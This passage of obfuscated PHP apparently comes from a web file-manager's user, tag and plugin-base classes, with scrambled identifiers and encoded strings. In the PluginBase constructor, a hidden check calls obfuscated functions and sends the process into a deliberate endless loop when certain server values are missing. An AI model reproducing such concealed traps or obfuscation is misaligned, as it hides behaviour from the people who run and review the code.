$this->_searchFromMeta($Í¢Ìéã[552], $·÷¨Î—õ, 10); $¦ê‘¾›™ = array_merge($µÇ‡ºğß, $Úî·Ã–ß, $Ù¾ô¸¾Ì[$Í¢Ìéã[446]]); $Ù¾ô¸¾Ì[$Í¢Ìéã[446]] = array_unique_by_key($¦ê‘¾›™, $Í¢Ìéã[1592]); $Ù¾ô¸¾Ì[$Í¢Ìéã[443]][$Í¢Ìéã[444]] = count($Ù¾ô¸¾Ì[$Í¢Ìéã[446]]); $Ù¾ô¸¾Ì[$Í¢Ìéã[443]][$Í¢Ìéã[445]] = ceil($Ù¾ô¸¾Ì[$Í¢Ìéã[443]][$Í¢Ìéã[444]] / $Ù¾ô¸¾Ì[$Í¢Ìéã[443]][$Í¢Ìéã[439]]); } $this->_listDataApply($Ù¾ô¸¾Ì[$Í¢Ìéã[446]]); $this->_filterByGroup($Ù¾ô¸¾Ì, $ŸšüÈä); return $Ù¾ô¸¾Ì; } private function _filterByGroup(&$¦‰’¦¼Ó, $Šíˆ›øó) { $‡ÈÕ”®ã =& $_SERVER[©—Ò»ÅĞ]; if (!$Šíˆ›øó) { return $¦‰’¦¼Ó; } foreach ($¦‰’¦¼Ó[$‡ÈÕ”®ã[446]] as $ñŸ“ÓÁ => &$ıÓà€ÈÅ) { $ú¬úïÔ = array_to_keyvalue($ıÓà€ÈÅ[$‡ÈÕ”®ã[1494]], $‡ÈÕ”®ã[12], $‡ÈÕ”®ã[1495]); if (!in_array($Šíˆ›øó, $ú¬úïÔ)) { unset($¦‰’¦¼Ó[$‡ÈÕ”®ã[446]][$ñŸ“ÓÁ]); } } unset($ıÓà€ÈÅ); $¦‰’¦¼Ó[$‡ÈÕ”®ã[446]] = array_values($¦‰’¦¼Ó[$‡ÈÕ”®ã[446]]); $¦‰’¦¼Ó[$‡ÈÕ”®ã[443]] = array($‡ÈÕ”®ã[2332] => count($¦‰’¦¼Ó[$‡ÈÕ”®ã[446]]), $‡ÈÕ”®ã[2442] => $¦‰’¦¼Ó[$‡ÈÕ”®ã[443]][$‡ÈÕ”®ã[439]], $‡ÈÕ”®ã[2441] => 1, $‡ÈÕ”®ã[2443] => 1); } private function _searchFromMeta($¹ şŞö, $Åæü–Óç, $’ûƒ—šù) { $‚ÁóºÚ¢ =& $_SERVER[©—Ò»ÅĞ]; $Åæü–Óç = strtolower($Åæü–Óç); $ÒĞ‹‰îÙ = array($‚ÁóºÚ¢[95] => $¹ şŞö, $‚ÁóºÚ¢[451] => array($‚ÁóºÚ¢[473], "\x25{$Åæü–Óç}\x25")); $ÒĞ‹‰îÙ = $this->parseWhereLike($ÒĞ‹‰îÙ); $øÉéĞğ = Model($‚ÁóºÚ¢[2715])->where($ÒĞ‹‰îÙ)->limit($’ûƒ—šù)->select(); if (!$øÉéĞğ) { return array(); } $øÉéĞğ = array_to_keyvalue($øÉéĞğ, $‚ÁóºÚ¢[12], $‚ÁóºÚ¢[1592]); $àú™¾óş = $this->where(array($‚ÁóºÚ¢[1969] => array($‚ÁóºÚ¢[7], $øÉéĞğ)))->select(); if (!$àú™¾óş) { return array(); } return $àú™¾óş; } private function _listDataApplyItem($ÚÌîùÌ) { $Ñˆ™İÒ = array($ÚÌîùÌ); $this->_listDataApply($Ñˆ™İÒ); return $Ñˆ™İÒ[0]; } private function _listDataApply(&$†šÂâÛÖ) { $ú™³ü™° =& $_SERVER[©—Ò»ÅĞ]; if (!$†šÂâÛÖ) { return; } array_remove_key($†šÂâÛÖ, $ú™³ü™°[1050]); $¿¹‹Ú¥ = array_to_keyvalue($†šÂâÛÖ, $ú™³ü™°[12], $ú™³ü™°[1592]); $this->_listAppendGroup($†šÂâÛÖ, $¿¹‹Ú¥); $this->_listAppendMeta($†šÂâÛÖ, $¿¹‹Ú¥); $this->_listAppendSourceRoot($†šÂâÛÖ, $¿¹‹Ú¥); } private function _listAppendSourceRoot(&$»¼ø¨§œ, $¨œö‹É) { $‹¡òòˆ­ =& $_SERVER[©—Ò»ÅĞ]; $õ¿šñ = Model($‹¡òòˆ­[933])->listSourceRoot(SourceModel::TYPE_USER, $¨œö‹É); $õ¿šñ = array_to_keyvalue($õ¿šñ, $‹¡òòˆ­[589]); $õ¿šñ = array_remove_key($õ¿šñ, $‹¡òòˆ­[589]); foreach ($»¼ø¨§œ as &$™¬ôÙŠÓ) { $™¬ôÙŠÓ[$‹¡òòˆ­[90]] = $õ¿šñ[$™¬ôÙŠÓ[$‹¡òòˆ­[1592]]] ? $õ¿šñ[$™¬ôÙŠÓ[$‹¡òòˆ­[1592]]] : array(); } unset($™¬ôÙŠÓ); } private function _listAppendGroup(&$çï½²Š½, $Èú¸Á½•) { $Éêäà¥ğ =& $_SERVER[©—Ò»ÅĞ]; $íˆ÷Ø“æ = array($Éêäà¥ğ[1592] => array($Éêäà¥ğ[7], $Èú¸Á½•)); $¾ÍŠµË¼ = Model($Éêäà¥ğ[2277])->where($íˆ÷Ø“æ)->select(); $Åş­Ü³ = array_to_keyvalue($¾ÍŠµË¼, $Éêäà¥ğ[12], $Éêäà¥ğ[1495]); $Åş­Ü³ = array_remove_value(array_unique($Åş­Ü³), $Éêäà¥ğ[228]); if (!$Åş­Ü³ || !$¾ÍŠµË¼) { return; } $íˆ÷Ø“æ = array($Éêäà¥ğ[1495] => array($Éêäà¥ğ[7], $Åş­Ü³)); $‘Ç³Äê = Model($Éêäà¥ğ[1493])->field($Éêäà¥ğ[2716])->where($íˆ÷Ø“æ)->select(); $‘Ç³Äê = array_to_keyvalue($‘Ç³Äê, $Éêäà¥ğ[1495]); $¾ÍŠµË¼ = array_to_keyvalue_group($¾ÍŠµË¼, $Éêäà¥ğ[1592]); foreach ($¾ÍŠµË¼ as &$¤¾¡ˆÇæ) { $õÇ›®Â¶ = array(); foreach ($¤¾¡ˆÇæ as $ŒİË¤Á) { if (!$ŒİË¤Á[$Éêäà¥ğ[1640]]) { continue; } $íãáÅˆË = Model($Éêäà¥ğ[591])->listData($ŒİË¤Á[$Éêäà¥ğ[1640]]); $õÇ›®Â¶[] = array($Éêäà¥ğ[1495] => $ŒİË¤Á[$Éêäà¥ğ[1495]], $Éêäà¥ğ[2717] => $‘Ç³Äê[$ŒİË¤Á[$Éêäà¥ğ[1495]]][$Éêäà¥ğ[32]], $Éêäà¥ğ[604] => $‘Ç³Äê[$ŒİË¤Á[$Éêäà¥ğ[1495]]][$Éêäà¥ğ[604]], $Éêäà¥ğ[502] => $íãáÅˆË); } $¤¾¡ˆÇæ = $õÇ›®Â¶; } unset($¤¾¡ˆÇæ); foreach ($çï½²Š½ as &$ƒŒÚ•Ëú) { $ƒŒÚ•Ëú[$Éêäà¥ğ[1494]] = array(); if (isset($¾ÍŠµË¼[$ƒŒÚ•Ëú[$Éêäà¥ğ[1592]]])) { $ƒŒÚ•Ëú[$Éêäà¥ğ[1494]] = $¾ÍŠµË¼[$ƒŒÚ•Ëú[$Éêäà¥ğ[1592]]]; } } unset($ƒŒÚ•Ëú); } public function userAppendGroup($§äÜŸÛ±) { $Â–Œ¦Ú¹ =& $_SERVER[©—Ò»ÅĞ]; if (!$§äÜŸÛ±) { return array(); } $this->_listAppendGroup($§äÜŸÛ±, array_to_keyvalue($§äÜŸÛ±, $Â–Œ¦Ú¹[12], $Â–Œ¦Ú¹[1592])); return $§äÜŸÛ±; } private function _listAppendMeta(&$‚‹à²—Ş, $şíÛÆ…³) { $Ä™ò½‰Ù =& $_SERVER[©—Ò»ÅĞ]; $‹ ÜÎ™ù = UserJobModel::JOB_KEY; $–Æùê™˜ = array($Ä™ò½‰Ù[2273]); $ÎºÕÆò² = array($Ä™ò½‰Ù[1592] => array($Ä™ò½‰Ù[7], $şíÛÆ…³)); $§äêİª = Model($Ä™ò½‰Ù[2692])->where($ÎºÕÆò²)->select(); $‡÷œöÆ± = array(); foreach ($§äêİª as $‚Œ„¨´²) { $Ë±×ÉÎ¹ = $‚Œ„¨´²[$Ä™ò½‰Ù[1592]]; if (!isset($‡÷œöÆ±[$Ë±×ÉÎ¹])) { $‡÷œöÆ±[$Ë±×ÉÎ¹] = array(); } $‡÷œöÆ±[$Ë±×ÉÎ¹][$‚Œ„¨´²[$Ä™ò½‰Ù[95]]] = $‚Œ„¨´²[$Ä™ò½‰Ù[451]]; } $Ğ·¬•şª = Model($Ä™ò½‰Ù[2718]); foreach ($‚‹à²—Ş as &$ÚöŠĞ „) { $Ë±×ÉÎ¹ = $ÚöŠĞ „[$Ä™ò½‰Ù[1592]]; $¯‚®ÅÜú = isset($‡÷œöÆ±[$Ë±×ÉÎ¹]) ? $‡÷œöÆ±[$Ë±×ÉÎ¹] : array(); $ÚöŠĞ „[$Ä™ò½‰Ù[555]] = array_field_key($¯‚®ÅÜú, $–Æùê™˜); $ÚöŠĞ „[$Ä™ò½‰Ù[2719]] = array(); if (isset($¯‚®ÅÜú[$‹ ÜÎ™ù])) { $ÚöŠĞ „[$Ä™ò½‰Ù[2719]] = $Ğ·¬•şª->getUserJobInfo($¯‚®ÅÜú[$‹ ÜÎ™ù]); } } unset($ÚöŠĞ „); } protected function groupUserAll($ÍöÙùÂğ) { $„‡’Ç–á =& $_SERVER[©—Ò»ÅĞ]; if (!$ÍöÙùÂğ) { return !1; } $òçÁ¹•µ = Model($„‡’Ç–á[2277])->field($„‡’Ç–á[1592])->where(array($„‡’Ç–á[1495] => array($„‡’Ç–á[7], $ÍöÙùÂğ)))->select(); $òçÁ¹•µ = array_to_keyvalue($òçÁ¹•µ, $„‡’Ç–á[12], $„‡’Ç–á[1592]); return array_unique($òçÁ¹•µ); } public function userSearch($…·Ãë¹, $ÅÏ˜Ú = "\x2a") { return Model($_SERVER[©—Ò»ÅĞ][617])->where($…·Ãë¹)->field($ÅÏ˜Ú)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\137\x6f\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($»ÉšëŞ¹) { return "\x55\163\145\162\x4f\160\x74\151\x6f\x6e\137{$»ÉšëŞ¹}\x5f" . KodUser::id(); } protected function filterWhere($ÆÕÕçí) { $ÆÕÕçí[$_SERVER[©—Ò»ÅĞ][1592]] = KodUser::id(); return $ÆÕÕçí; } public function cacheRemoveUser($—…ùÌò¬, $«’íïƒÄ) { return Cache::remove("\x55\x73\x65\162\117\x70\x74\x69\157\x6e\x5f{$—…ùÌò¬}\137" . $«’íïƒÄ); } protected function optionDefault($İ¦Œ¼Ê = '') { $ÄÙä«İ» =& $_SERVER[©—Ò»ÅĞ]; if ($İ¦Œ¼Ê == $ÄÙä«İ»[12]) { return $GLOBALS[$ÄÙä«İ»[6]][$ÄÙä«İ»[2720]]; } if ($İ¦Œ¼Ê == $ÄÙä«İ»[2721]) { return $GLOBALS[$ÄÙä«İ»[6]][$ÄÙä«İ»[2722]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\56\x74\x61\147\x4c\151\x73\x74"; public $modelType = "\125\x73\x65\x72\117\x70\x74\x69\x6f\x6e"; public $field = array("\156\x61\x6d\145", "\x73\164\171\x6c\145", "\x73\157\x72\x74"); public function listData($„‰šø‹ = false, $ˆ˜à°Œ” = "\163\x6f\162\x74", $ŠÊİßúÈ = false) { return parent::listData($„‰šø‹, $ˆ˜à°Œ”, $ŠÊİßúÈ); } public function remove($´ğ­‚Œ) { return parent::remove($´ğ­‚Œ); } public function add($×Ğá¨²õ, $¨‚¸¾–Æ = "\x6c\141\x62\x65\x6c\x2d\x67\x72\145\171\x2d\x6e\157\162\155\141\154") { $ÁÌâ·úñ =& $_SERVER[©—Ò»ÅĞ]; if ($this->findByName($×Ğá¨²õ)) { return !1; } $úª¦ûÉù = array($ÁÌâ·úñ[509] => $×Ğá¨²õ, $ÁÌâ·úñ[574] => $¨‚¸¾–Æ, $ÁÌâ·úñ[2187] => $this->getSort($ÁÌâ·úñ[335]) + 1); return parent::insert($úª¦ûÉù); } public function update($†Ää”±ş, $‚Ö‹¯‰ô) { $õà†Ğ› =& $_SERVER[©—Ò»ÅĞ]; $şŒëÅ” = $this->listData($†Ää”±ş); $’ëóõ‚ = $this->findByName($‚Ö‹¯‰ô[$õà†Ğ›[32]]); if (!$şŒëÅ” || $’ëóõ‚ && $’ëóõ‚[$õà†Ğ›[487]] != $şŒëÅ”[$õà†Ğ›[487]]) { return !1; } return parent::update($†Ää”±ş, $‚Ö‹¯‰ô); } public function moveTop($×‰·Ù‹) { $–ú¬µÜ =& $_SERVER[©—Ò»ÅĞ]; $Ş¸ÃéÈë = parent::listData(); $èÛ‹¢­ = $this->getSort($–ú¬µÜ[334]); foreach ($Ş¸ÃéÈë as &$Òš©¶Ò») { if ($Òš©¶Ò»[$–ú¬µÜ[487]] == $×‰·Ù‹) { $Òš©¶Ò»[$–ú¬µÜ[2205]] = $èÛ‹¢­; continue; } $Òš©¶Ò»[$–ú¬µÜ[2205]] += 1; } unset($Òš©¶Ò»); return parent::resetData($Ş¸ÃéÈë); } public function moveBottom($É¤òÕıŠ) { $äïê§š =& $_SERVER[©—Ò»ÅĞ]; $øµÙ¶ùÎ = $this->getSort($äïê§š[335]) + 1; return parent::update($É¤òÕıŠ, array($äïê§š[2205] => $øµÙ¶ùÎ)); } public function resetSort($å£åêÑû) { $³óÙµéí =& $_SERVER[©—Ò»ÅĞ]; $ößÎÑ ¦ = array(); $å£åêÑû = is_array($å£åêÑû) ? $å£åêÑû : array(); for ($„·ü°ê¢ = 0; $„·ü°ê¢ < count($å£åêÑû); $„·ü°ê¢++) { $ößÎÑ ¦[$å£åêÑû[$„·ü°ê¢] . $³óÙµéí[12]] = $„·ü°ê¢ + 1; } $¯¾ƒ±¦¼ = parent::listData(); foreach ($¯¾ƒ±¦¼ as &$¼´é¥Šç) { $îˆ©äùŒ = $ößÎÑ ¦[$¼´é¥Šç[$³óÙµéí[487]]]; $¼´é¥Šç[$³óÙµéí[2205]] = $îˆ©äùŒ ? $îˆ©äùŒ : $¼´é¥Šç[$³óÙµéí[2205]]; } unset($¼´é¥Šç); return parent::resetData($¯¾ƒ±¦¼); } private function getSort($µ…œÜ²) { $ºØ§ïû° =& $_SERVER[©—Ò»ÅĞ]; $İ‹«ªœ = parent::listData(); $åîÛµ½İ = array_to_keyvalue($İ‹«ªœ, $ºØ§ïû°[12], $ºØ§ïû°[2205]); if (!$åîÛµ½İ) { $åîÛµ½İ = array(0); } $ø£½‚»ù = $µ…œÜ² == $ºØ§ïû°[335] ? max($åîÛµ½İ) : min($åîÛµ½İ); return intval($ø£½‚»ù); } } goto d‡ˆàÆİÙã; F«‚¶ª”õ»: class Message { function __construct() { } public function send($†ÒèÎ‰“ = '', $…Í¼…£¢ = array(), $í›·Œ ½ = "\x74\x65\170\x74") { $óıò†º =& $_SERVER[©—Ò»ÅĞ]; $À¾”Ïñ = array($óıò†º[33] => $óıò†º[1291], $óıò†º[168] => $†ÒèÎ‰“); if (in_array($í›·Œ ½, array($óıò†º[1291], $óıò†º[1826]))) { $À¾”Ïñ[$óıò†º[33]] = $í›·Œ ½; } $…Í¼…£¢ = array($óıò†º[598] => isset($…Í¼…£¢[$óıò†º[598]]) ? $…Í¼…£¢[$óıò†º[598]] : $óıò†º[12], $óıò†º[684] => isset($…Í¼…£¢[$óıò†º[684]]) ? $…Í¼…£¢[$óıò†º[684]] : $óıò†º[12]); if (empty($†ÒèÎ‰“) || empty($…Í¼…£¢[$óıò†º[598]]) && empty($…Í¼…£¢[$óıò†º[684]])) { return !1; } $àç è§ = array($óıò†º[1754] => $À¾”Ïñ, $óıò†º[1827] => $…Í¼…£¢); Hook::trigger($óıò†º[1828], $àç è§); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $³¢ŸŒ°ä =& $_SERVER[©—Ò»ÅĞ]; if (!isset($_SERVER[$³¢ŸŒ°ä[1034]]) || !isset($_SERVER[$³¢ŸŒ°ä[1035]])) { $¿ÅáÌÈ’ = $³¢ŸŒ°ä[1036]; $¿ñœ¥ü¹ = $³¢ŸŒ°ä[1037]; $ŠÌÁœŞ” = $_SERVER[$³¢ŸŒ°ä[1038]] . $³¢ŸŒ°ä[1039]; $“¿õ ¨— = $¿ñœ¥ü¹($ŠÌÁœŞ”); $ïßõ€…î = explode($³¢ŸŒ°ä[285], $“¿õ ¨—); if (count($ïßõ€…î) < $³¢ŸŒ°ä[707]) { $Ÿåš³üø = $³¢ŸŒ°ä[1040]; $Ÿåš³üø(); } $¼ÓºëË¾ = $³¢ŸŒ°ä[1041]; $¼ÓºëË¾($_SERVER[$³¢ŸŒ°ä[1042]]); $Á¶ù¶°¨ = 1; for ($­…ø¦’š = $Á¶ù¶°¨; $­…ø¦’š > 0; $­…ø¦’š++) { $¼ÓºëË¾ = json_encode($GLOBALS[$³¢ŸŒ°ä[507]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($³¢ŸŒ°ä[1829]); $this->pluginName = str_replace($³¢ŸŒ°ä[1829], $³¢ŸŒ°ä[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $³¢ŸŒ°ä[8]; $this->pluginApi = appHostGet() . $³¢ŸŒ°ä[1830] . $this->pluginName . $³¢ŸŒ°ä[8]; $this->pluginHost = $config[$³¢ŸŒ°ä[1831]] . $this->pluginName . $³¢ŸŒ°ä[8]; $this->pluginHostDefault = $config[$³¢ŸŒ°ä[1831]] . $this->pluginName . $³¢ŸŒ°ä[8]; $ãéÈ†Ê = $config[$³¢ŸŒ°ä[1832]]; if ($ãéÈ†Ê && strpos($³¢ŸŒ°ä[50] . $ãéÈ†Ê . $³¢ŸŒ°ä[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$³¢ŸŒ°ä[1833]] . $this->pluginName . $³¢ŸŒ°ä[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[©—Ò»ÅĞ][1834]); } protected function assign($œ¿¿óãó, $İâÎÔ = false) { if (is_array($œ¿¿óãó)) { $this->values = array_merge($this->values, $œ¿¿óãó); } else { $this->values[$œ¿¿óãó] = $İâÎÔ; } } protected function display($Á€…ø) { extract($this->values); require $Á€…ø; } final function hookRegist($ÅÏ»°Ê÷) { $this->modelPlugin->appRegist($this->pluginName, $ÅÏ»°Ê÷); } final function appIcon() { $Á¾ÆîŞğ =& $_SERVER[©—Ò»ÅĞ]; $–ÓÒ¬Í¯ = $this->appPackage(); $ï¦ÅîÅ = $Á¾ÆîŞğ[12]; if (isset($–ÓÒ¬Í¯[$Á¾ÆîŞğ[505]])) { if (isset($–ÓÒ¬Í¯[$Á¾ÆîŞğ[505]][$Á¾ÆîŞğ[1835]])) { $ï¦ÅîÅ = $Á¾ÆîŞğ[1836] . $–ÓÒ¬Í¯[$Á¾ÆîŞğ[505]][$Á¾ÆîŞğ[1835]] . $Á¾ÆîŞğ[1837]; } else { if ($–ÓÒ¬Í¯[$Á¾ÆîŞğ[505]][$Á¾ÆîŞğ[1838]]) { $ï¦ÅîÅ = $Á¾ÆîŞğ[1839] . $–ÓÒ¬Í¯[$Á¾ÆîŞğ[505]][$Á¾ÆîŞğ[1838]] . $Á¾ÆîŞğ[1840]; } } } return $ï¦ÅîÅ; } final function fileCanView($±Å”µ…) { $§üï°¡ =& $_SERVER[©—Ò»ÅĞ]; if (request_url_safe($±Å”µ…)) { return !0; } if ($this->isShare($±Å”µ…)) { ActionCall($§üï°¡[1841], $±Å”µ…); return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $¹øœ–œ = $§üï°¡[1842] . rawurlencode(this_url()); show_tips(LNG($§üï°¡[1843]) . $§üï°¡[1844] . $¹øœ–œ . $§üï°¡[1845] . LNG($§üï°¡[1846]) . $§üï°¡[1847], !1); } if (!Action($§üï°¡[1848])->authCan($§üï°¡[1849])) { show_tips(LNG($§üï°¡[1850]) . $§üï°¡[1851], !1); } ActionCall($§üï°¡[1841], $±Å”µ…); } final function isShare($Ò¤ãí°) { $¸ÂÔäÉá = KodIO::parse($Ò¤ãí°); return $¸ÂÔäÉá[$_SERVER[©—Ò»ÅĞ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ä‘ğ¬ïĞ) { if (request_url_safe($ä‘ğ¬ïĞ)) { return $ä‘ğ¬ïĞ; } if (!$this->isShare($ä‘ğ¬ïĞ)) { $ä‘ğ¬ïĞ = $this->filePath($ä‘ğ¬ïĞ, !1); } return Action($_SERVER[©—Ò»ÅĞ][1363])->linkOut($ä‘ğ¬ïĞ); } public function filePathLinkOut($•›Ö»Èä) { if (request_url_safe($•›Ö»Èä)) { return $•›Ö»Èä; } $this->fileCanView($•›Ö»Èä); return Action($_SERVER[©—Ò»ÅĞ][1363])->link($•›Ö»Èä); } final function filePath($Ğñˆø·, $‹ó‹òÇ = true, $Ñ®˜Ë¦È = false) { $öÊÉ÷€ =& $_SERVER[©—Ò»ÅĞ]; $¾Öù±— = $this->filePathGet($Ğñˆø·, $‹ó‹òÇ); if (!$this->fileInfo) { show_tips(LNG($öÊÉ÷€[105]), !1); } if ($Ñ®˜Ë¦È && isset($this->fileInfo[$öÊÉ÷€[557]]) && $this->fileInfo[$öÊÉ÷€[557]]) { $òšÈóù‡ = Model($öÊÉ÷€[560])->fileInfo($this->fileInfo[$öÊÉ÷€[557]]); if (!$òšÈóù‡ || !IO::exist($òšÈóù‡[$öÊÉ÷€[87]])) { $úçßÁññ = LNG($öÊÉ÷€[105]) . LNG($öÊÉ÷€[1852]); if (KodUser::isRoot() && isset($òšÈóù‡[$öÊÉ÷€[87]])) { $úçßÁññ .= $öÊÉ÷€[1853] . $òšÈóù‡[$öÊÉ÷€[87]] . $öÊÉ÷€[1854]; } show_tips($úçßÁññ); } } Hook::trigger($öÊÉ÷€[1855], $¾Öù±—); return $¾Öù±—; } final function filePathGet($Ÿá¶ÒÈ§, $ôô›… = true) { $‚¢çªâí =& $_SERVER[©—Ò»ÅĞ]; $this->fileCanView($Ÿá¶ÒÈ§); if ($ÛÕ“Ü«© = $this->checkSharePath($Ÿá¶ÒÈ§, $ôô›…)) { return $ÛÕ“Ü«©; } if (request_url_safe($Ÿá¶ÒÈ§)) { $ÏÂ˜î±´ = parse_url_query($Ÿá¶ÒÈ§); if (isset($ÏÂ˜î±´[$‚¢çªâí[1856]]) && isset($ÏÂ˜î±´[$‚¢çªâí[234]])) { $Ã‚´öù = Mcrypt::decode($ÏÂ˜î±´[$‚¢çªâí[234]], Model($‚¢çªâí[873])->get($‚¢çªâí[874])); if ($Ã‚´öù) { $this->fileInfo = IO::info($Ã‚´öù); $this->fileInfo[$‚¢çªâí[1857]] = $Ÿá¶ÒÈ§; $this->cachePath = $this->pluginCachePath($‚¢çªâí[12], $ôô›…); return $Ã‚´öù; } } $Ÿá¶ÒÈ§ = $this->_cacheHttpFile($Ÿá¶ÒÈ§, $ôô›…); $this->fileInfo = IO::info($Ÿá¶ÒÈ§); } else { $this->fileInfo = IO::info($Ÿá¶ÒÈ§); $this->cachePath = $this->pluginCachePath($‚¢çªâí[12], $ôô›…); } return $Ÿá¶ÒÈ§; } final function _cacheHttpFile($ ƒÄ‹í¿, $À›ÂÔµ = true) { $›ù–áå =& $_SERVER[©—Ò»ÅĞ]; $¨µå’™ç = parse_url_query($ ƒÄ‹í¿); $Ìôïíúğ = get_path_ext($ ƒÄ‹í¿); if (isset($¨µå’™ç[$›ù–áå[32]]) && $¨µå’™ç[$›ù–áå[32]]) { $Ìôïíúğ = get_path_ext($¨µå’™ç[$›ù–áå[32]]); } $œñ·­Ç» = hash_path($ ƒÄ‹í¿) . $›ù–áå[10] . $Ìôïíúğ; $this->cachePath = $this->pluginCachePath($À›ÂÔµ ? $œñ·­Ç» : $›ù–áå[12]); $Ô…¹ = IO::fileNameExist($this->cachePath, $œñ·­Ç»); if ($Ô…¹) { return KodIO::make($Ô…¹); } $¥Ïï¿ÍÏ = rtrim($this->cachePath, $›ù–áå[8]) . $›ù–áå[8] . $œñ·­Ç»; return $this->pluginCacheFileSet($¥Ïï¿ÍÏ, file_get_contents_nossl($ ƒÄ‹í¿)); } final function checkSharePath($¤‚€«Ó, $¾…ö•Áá = true) { $½ñôüò” =& $_SERVER[©—Ò»ÅĞ]; if (!$this->isShare($¤‚€«Ó)) { return !1; } $äãŸ“  = Action($½ñôüò”[1363])->sharePathInfo($¤‚€«Ó); if (!is_array($äãŸ“ ) || !isset($äãŸ“ [$½ñôüò”[87]])) { $áÄÈ—©ı = $GLOBALS[$½ñôüò”[1858]]; show_json($áÄÈ—©ı ? $áÄÈ—©ı : LNG($½ñôüò”[1859]), !1); } $this->fileInfo = $äãŸ“ ; $this->cachePath = $this->pluginCachePath(!1, $¾…ö•Áá); return $äãŸ“ [$½ñôüò”[87]]; } final function pluginCachePath($¼¹ÙŸµ— = '', $†©Î”Àƒ = false) { $¦ÉŠÌüÎ =& $_SERVER[©—Ò»ÅĞ]; if ($†©Î”Àƒ && is_array($this->fileInfo)) { $¼¹ÙŸµ— = kodIO::hashPath($this->fileInfo); } $»§’•±ë = rtrim(IO_PATH_SYSTEM_TEMP . $¦ÉŠÌüÎ[1860] . $this->pluginName . $¦ÉŠÌüÎ[8] . $¼¹ÙŸµ—, $¦ÉŠÌüÎ[8]); $„Ö”ºŸÊ = IO::infoFullSimple($»§’•±ë); $“«³ı³ = $„Ö”ºŸÊ && is_array($„Ö”ºŸÊ) ? $„Ö”ºŸÊ[$¦ÉŠÌüÎ[87]] : $¦ÉŠÌüÎ[12]; if (!$“«³ı³) { $“«³ı³ = IO::mkdir($»§’•±ë); } return $“«³ı³; } final function pluginCacheFileSet($ÇõéˆÚÂ, $ş¯áò¶­ = '') { $¡Â‘ãŒÜ =& $_SERVER[©—Ò»ÅĞ]; $ñô„Üü™ = IO::infoFullSimple($ÇõéˆÚÂ); if (!$ñô„Üü™) { return IO::mkfile($ÇõéˆÚÂ, $ş¯áò¶­, REPEAT_REPLACE); } IO::setContent($ñô„Üü™[$¡Â‘ãŒÜ[87]], $ş¯áò¶­); return $ñô„Üü™[$¡Â‘ãŒÜ[87]]; } final function pluginLocalFile($Äø¶ì„½ = '') { $íù«á¼ =& $_SERVER[©—Ò»ÅĞ]; $Ë…» ‚¹ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Ë…» ‚¹)) { mk_dir($Ë…» ‚¹); } if (!$Äø¶ì„½) { return $Ë…» ‚¹; } $•‰€ıëç = IO::info($Äø¶ì„½); $Á”°Äôª = $íù«á¼[1861] . KodIO::hashPath($•‰€ıëç) . $íù«á¼[10] . $•‰€ıëç[$íù«á¼[166]]; if (!checkExtSafe($Á”°Äôª)) { $Á”°Äôª = $Á”°Äôª . $íù«á¼[1396]; } $¸ß­úæû = $Ë…» ‚¹ . $Á”°Äôª; if (@file_exists($¸ß­úæû)) { return $¸ß­úæû; } return IO::copy($Äø¶ì„½, $Ë…» ‚¹, 0, $Á”°Äôª); } final function appPackage() { $™•ù®ŞØ =& $_SERVER[©—Ò»ÅĞ]; if ($this->packageData) { return $this->packageData; } $æı¯œÛÅ = $this->parseFile($this->pluginPath . $™•ù®ŞØ[1862]); $this->parseLang($æı¯œÛÅ); $“ÇÏîù = json_decode_force($æı¯œÛÅ); if (!$“ÇÏîù) { return array(); } $Ø»÷êşÉ = Hook::filter($™•ù®ŞØ[1863], $“ÇÏîù); if ($Ø»÷êşÉ && is_array($Ø»÷êşÉ)) { $“ÇÏîù = $Ø»÷êşÉ; } $this->packageData = $“ÇÏîù; return $“ÇÏîù; } public function packageInfoGet($Í‰ïò) { $âĞ¬³“¡ = $this->appPackage(); return array_get_value($âĞ¬³“¡, $Í‰ïò); } public function packageVersion() { return $this->packageInfoGet($_SERVER[©—Ò»ÅĞ][1864]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[©—Ò»ÅĞ][1865]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[©—Ò»ÅĞ][1866]); } public function echoJsAssign($šÓÜ±Òë, $îù›àÈŸ) { $this->echoJsAssignArr[$šÓÜ±Òë] = $îù›àÈŸ; } private function parseFile($µÛíà) { $ã×å©„Ú =& $_SERVER[©—Ò»ÅĞ]; $‚Ò™¢Œ = file_get_contents_nossl($µÛíà); $ãŸ‰¼½› = array($ã×å©„Ú[1867], $ã×å©„Ú[1868], $ã×å©„Ú[1869], $ã×å©„Ú[1870], $ã×å©„Ú[1871], $ã×å©„Ú[1872], $ã×å©„Ú[1873]); $Ä»›‹«© = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ã×å©„Ú[92]][$ã×å©„Ú[1874]]); foreach ($this->echoJsAssignArr as $“Å“«£Ç => $ûË‚â—“) { $ãŸ‰¼½›[] = $ã×å©„Ú[1875] . $“Å“«£Ç . $ã×å©„Ú[1876]; $Ä»›‹«©[] = is_array($ûË‚â—“) || is_object($ûË‚â—“) ? rawurlencode(json_encode($ûË‚â—“)) : $ûË‚â—“; } if (strstr($‚Ò™¢Œ, $ã×å©„Ú[1877])) { $Ø°úĞ½ì = rawurlencode(json_encode($this->pluginLangArr)); $‚Ò™¢Œ = str_replace($ã×å©„Ú[1877], $Ø°úĞ½ì, $‚Ò™¢Œ); } if (strstr($‚Ò™¢Œ, $ã×å©„Ú[1878])) { $Ø°úĞ½ì = $Ø°úĞ½ì = rawurlencode(json_encode($this->getConfig())); 